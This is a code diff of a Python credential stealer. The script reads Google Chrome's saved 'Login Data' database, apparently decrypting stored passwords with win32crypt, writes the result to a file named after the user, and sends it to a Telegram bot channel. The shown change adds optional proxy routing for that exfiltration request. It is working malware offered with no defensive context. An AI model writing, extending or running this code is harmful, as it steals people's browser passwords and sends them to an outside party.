@@ -1,8 +1,12 @@
 import os, sqlite3, win32crypt, requests, shutil
 
-URL       = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
-TOKEN     = ...
-CHANNELID = ...
+USE_PROXY   = True
+PROXY_IP    = ...
+PROXY_PORT  = ...
+
+URL         = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
+TOKEN       = ...
+CHANNELID   = ...
 
 databasePath = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
 result = '=== Extracted from %s computer ===\n' % os.environ['USERNAME']
@@ -26,5 +30,7 @@ if os.path.exists(databasePath):
     except Exception as e: result = '[-] Error: ' + str(e)
 else: result = '[!] Google Chrome is not installed!'
 
+proxyDict = {'https': 'https://%s:%s' % (PROXY_IP, PROXY_PORT)} if USE_PROXY else None
+
 open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
-requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
+requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result), proxies = proxyDict)
